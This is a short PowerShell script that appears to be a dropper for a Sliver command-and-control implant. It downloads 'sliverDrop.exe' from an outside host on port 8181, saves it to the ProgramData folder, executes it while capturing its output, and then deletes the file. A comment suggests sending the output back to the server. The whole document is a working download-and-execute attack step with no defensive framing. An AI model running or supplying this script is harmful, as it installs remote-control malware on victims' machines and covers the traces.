# Define the URL and target path
$url = "http://sliver.nosfera0x2.com:8181/sliverDrop.exe"
$targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')
$targetFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')

# Create the target directory if it doesn't exist
if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
    New-Item -Path $targetDirectory -ItemType Directory
}

# Download the file
Invoke-WebRequest -Uri $url -OutFile $targetFile

# Execute the downloaded executable
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = $targetFile
$pinfo.RedirectStandardError = $true
$pinfo.RedirectStandardOutput = $true
$pinfo.UseShellExecute = $false

$p = New-Object System.Diagnostics.Process
$p.StartInfo = $pinfo
$p.Start() | Out-Null
$p.WaitForExit()
$stdout = $p.StandardOutput.ReadToEnd()
$stderr = $p.StandardError.ReadToEnd()

if ($p.ExitCode -ne 0) {
    $res = $stderr
} else {
    $res = $stdout
}

# Send the output of the executed file back to the server (if needed)
# You can add this part if you want to send the output back to a server

# Clean up (close and dispose of resources)
$p.Close()
$p.Dispose()

# Optionally, remove the downloaded file if you no longer need it
Remove-Item -Path $targetFile -Force
